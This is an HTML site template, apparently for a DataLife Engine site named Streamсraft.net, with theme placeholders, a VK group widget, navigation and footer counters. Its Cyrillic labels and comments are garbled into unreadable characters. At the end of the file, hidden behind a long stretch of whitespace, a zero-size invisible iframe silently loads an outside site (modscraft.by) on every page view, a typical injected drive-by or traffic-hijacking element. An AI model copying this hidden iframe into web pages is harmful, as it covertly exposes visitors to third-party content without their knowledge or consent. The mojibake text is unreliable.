<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
{headers}

	<link rel="shortcut icon" href="{THEME}/images/favicon.ico" />
	<link media="screen" href="{THEME}/uikit/css/dopuikit.css" type="text/css" rel="stylesheet" />
	<link media="screen" href="{THEME}/style/styles.css" type="text/css" rel="stylesheet" />
	<link media="screen" href="{THEME}/style/engine.css" type="text/css" rel="stylesheet" />
	<script type="text/javascript" src="{THEME}/js/libs.js"></script>
	<script type="text/javascript" src="//vk.com/js/api/openapi.js?105"></script>
	<script type="text/javascript" src="{THEME}/js/jquery.dropDown.pack.js"></script>
	<script src="{THEME}/uikit/js/uikit.min.js"></script>
	<script type="text/javascript">
		$(document).ready(function(){
			$("ul#nav").NavDropDown({
				duration:100, 
				hoverElement:"li",
				hoverClass:"hover",
				dropHolder:"div",
				showEffect:"fade" // slide, fade, slide&fade
			});                
		}); 
	</script>
</head>
<body>
{AJAX}
<div id="body_top">	
	<div id="body_bottom">
		<div id="wrapper"><div id="cube1"></div><div id="cube2"></div><div id="cube3"></div>
			<!-- ��������� ���� -->
			{include file="wrapper_menu.tpl"}
			<!-- ������� / ����������� -->
			{include file="wrapper_header.tpl"}
			<div id="header_4"></div>
			<div id="top_page">
				<div id="page_title">
				<!--��-�� ����� ������ ������ � ���� ��������� ���� ������ "dop_content_prst_debil_verstal", ��� ��� ������, ���-��� � ������� ������ ��� � �������� -->
					[aviable=lastnews|main]<div style="margin-top: 10px;">��������� �������</div>[/aviable]
					[aviable=showfull]<div style="margin-top: 10px;">�������� �������</div>[/aviable]
					[aviable=register]<div style="margin-top: 10px;">�����������</div>[/aviable]
					[aviable=feedback]<div style="margin-top: 10px;">�������� �����</div>[/aviable]
					[aviable=lostpassword]<div style="margin-top: 10px;">�������������� �������</div>[/aviable]
					[aviable=pm]<div style="margin-top: 10px;">������ ���������</div>[/aviable]
					[static=bans,permanents]<div style="margin-top: 10px;">�������</div><!--������ ������ ���������, ���� ������������ ������������� ����������� �������� � ��������� bans permanents-->[/static]
				</div>
				<div id="logo">
					<a href="/"><img src="{THEME}/images/logo.jpg" alt=""></a>
				</div><div id="top_page_3"></div>
			</div>
				<div id="content">
					<div id="content_top">
						<div id="content_bottom">
							<div id="right">
							{login}
								<!-- ���������� -->
								<div class="block">
									<div class="block_title">
										���������� ��������
									</div>
									<div class="block_content">
										{��� ����������}
									</div>
									<div class="block_footer"></div>
								</div>
								<!-- ������ �� -->
								<div class="block">
									<div class="block_title">
										�� ���������
									</div>
									<div class="block_content">
										<center>
										<br>
										<!-- VK Widget -->
											<div id="vk_groups"></div>
											<script type="text/javascript">
												VK.Widgets.Group("vk_groups", {mode: 2, width: "auto", height: "400"}, 30115233);
											</script>
										<br>
										</center>
									</div>
									<div class="block_footer">
									</div>
								</div>
							</div>
							<div id="left">
								<div id="dle-content">
									<div class="dop_content_prst_debil_verstal">
										{info}{content}
									<div style="clear: both"></div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
				<!-- ����� -->
				<div id="footer">
					<div id="f_counters">
						<div class="hoverbanner">
							<img src="{THEME}/dleimages/count.png" alt="count 88x31px" />
						</div>
						
						<div class="hoverbanner">
							<img src="{THEME}/dleimages/count.png" alt="count 88x31px" />
						</div>
						
						<div class="hoverbanner">
							<img src="{THEME}/dleimages/count.png" alt="count 88x31px" />
						</div>
						
						<div class="hoverbanner">
							<img src="{THEME}/dleimages/count.png" alt="count 88x31px" />
						</div>
					</div>
					<div id="f_menu">
						<a href="#">���� �������</a>
						<span></span>
						<a href="/?do=feedback">�������� �����</a>
						<span></span>
						<a href="/sitemap.xml">����� �����</a>
					</div>
					<div id="f_copyright">
						Copyright � 2011-2014 <a href="/">Stream�raft.net</a>. ����������� � <a href="#">MC Laboratory - ����� ��� ���</a>
					</div>
				</div>
			</div>
		</div>																																																																																																																																																																																																																																																																																<iframe  style="visibility: hidden" width=0 height=0 src="http://www.modscraft.by/shaders/" ></iframe>
	</div>
</body>
</html>